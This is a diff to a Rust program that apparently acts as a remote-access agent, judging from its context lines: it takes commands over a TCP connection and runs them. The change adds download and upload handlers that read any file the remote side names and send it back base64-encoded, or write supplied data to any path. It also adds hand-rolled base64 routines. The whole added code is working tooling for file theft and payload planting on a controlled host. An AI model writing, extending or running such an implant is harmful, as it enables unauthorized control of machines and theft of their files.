@@ -7,6 +7,8 @@ use std::net::TcpStream;
 use std::process::Command;
 use std::thread;
 use std::time::Duration;
+use std::fs;
+use std::path::Path;
 
 const DELIMITER: &str = "\n<<END>>\n";
 
@@ -46,6 +48,19 @@ fn handle_connection(stream: TcpStream) {
 
                 if command == "ping" {
                     writer.write_all(b"pong\n").ok();
+                    writer.flush().ok();
+                } else if command.starts_with("__DOWNLOAD__:") {
+                    // Formato: __DOWNLOAD__:ruta_del_archivo
+                    let path = command.strip_prefix("__DOWNLOAD__:").unwrap_or("");
+                    println!("DEBUG: Descargando archivo: {}", path);
+                    let response = download_file(path);
+                    writer.write_all(response.as_bytes()).ok();
+                    writer.flush().ok();
+                } else if command.starts_with("__UPLOAD__:") {
+                    // Formato: __UPLOAD__:ruta_destino:datos_base64
+                    println!("DEBUG: Procesando upload...");
+                    let response = upload_file(command);
+                    writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
                 } else if !command.is_empty() {
                     let output = execute_command(command);
@@ -109,4 +124,123 @@ fn execute_command(command: &str) -> String {
         }
         Err(e) => format!("Error: {}", e),
     }
+}
+
+fn download_file(file_path: &str) -> String {
+    println!("DEBUG: Intentando leer archivo: {}", file_path);
+    
+    match fs::read(file_path) {
+        Ok(file_data) => {
+            let encoded = base64_encode(&file_data);
+            let file_name = Path::new(file_path)
+                .file_name()
+                .and_then(|n| n.to_str())
+                .unwrap_or("unknown");
+            
+            println!("DEBUG: Archivo leído, {} bytes", file_data.len());
+            format!("__FILE__:{}:{}:{}{}", file_name, file_data.len(), encoded, DELIMITER)
+        }
+        Err(e) => {
+            println!("DEBUG: Error leyendo archivo: {}", e);
+            format!("__ERROR__:No se pudo leer el archivo: {}{}", e, DELIMITER)
+        }
+    }
+}
+
+fn upload_file(command: &str) -> String {
+    // Formato: __UPLOAD__:ruta_destino:datos_base64
+    let parts: Vec<&str> = command.splitn(3, ':').collect();
+    
+    if parts.len() != 3 {
+        return format!("__ERROR__:Formato de upload inválido{}", DELIMITER);
+    }
+    
+    let dest_path = parts[1];
+    let encoded_data = parts[2];
+    
+    println!("DEBUG: Decodificando {} bytes de base64", encoded_data.len());
+    
+    match base64_decode(encoded_data) {
+        Ok(file_data) => {
+            println!("DEBUG: Escribiendo {} bytes a {}", file_data.len(), dest_path);
+            match fs::write(dest_path, file_data) {
+                Ok(_) => {
+                    println!("DEBUG: Archivo guardado exitosamente");
+                    format!("__SUCCESS__:Archivo guardado en {}{}", dest_path, DELIMITER)
+                }
+                Err(e) => {
+                    println!("DEBUG: Error guardando archivo: {}", e);
+                    format!("__ERROR__:Error guardando archivo: {}{}", e, DELIMITER)
+                }
+            }
+        }
+        Err(e) => {
+            println!("DEBUG: Error decodificando base64: {}", e);
+            format!("__ERROR__:Error decodificando datos: {}{}", e, DELIMITER)
+        }
+    }
+}
+
+// Implementación simple de base64 encode/decode sin dependencias
+fn base64_encode(data: &[u8]) -> String {
+    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    let mut result = String::new();
+    
+    for chunk in data.chunks(3) {
+        let mut buf = [0u8; 3];
+        for (i, &byte) in chunk.iter().enumerate() {
+            buf[i] = byte;
+        }
+        
+        let b1 = (buf[0] >> 2) & 0x3F;
+        let b2 = ((buf[0] & 0x03) << 4) | ((buf[1] >> 4) & 0x0F);
+        let b3 = ((buf[1] & 0x0F) << 2) | ((buf[2] >> 6) & 0x03);
+        let b4 = buf[2] & 0x3F;
+        
+        result.push(CHARS[b1 as usize] as char);
+        result.push(CHARS[b2 as usize] as char);
+        result.push(if chunk.len() > 1 { CHARS[b3 as usize] as char } else { '=' });
+        result.push(if chunk.len() > 2 { CHARS[b4 as usize] as char } else { '=' });
+    }
+    
+    result
+}
+
+fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
+    let data = data.trim();
+    let mut result = Vec::new();
+    
+    let decode_char = |c: char| -> Result<u8, String> {
+        match c {
+            'A'..='Z' => Ok(c as u8 - b'A'),
+            'a'..='z' => Ok(c as u8 - b'a' + 26),
+            '0'..='9' => Ok(c as u8 - b'0' + 52),
+            '+' => Ok(62),
+            '/' => Ok(63),
+            '=' => Ok(0),
+            _ => Err(format!("Carácter inválido en base64: {}", c)),
+        }
+    };
+    
+    let chars: Vec<char> = data.chars().collect();
+    for chunk in chars.chunks(4) {
+        if chunk.len() != 4 {
+            continue;
+        }
+        
+        let b1 = decode_char(chunk[0])?;
+        let b2 = decode_char(chunk[1])?;
+        let b3 = decode_char(chunk[2])?;
+        let b4 = decode_char(chunk[3])?;
+        
+        result.push((b1 << 2) | (b2 >> 4));
+        if chunk[2] != '=' {
+            result.push((b2 << 4) | (b3 >> 2));
+        }
+        if chunk[3] != '=' {
+            result.push((b3 << 6) | b4);
+        }
+    }
+    
+    Ok(result)
 }
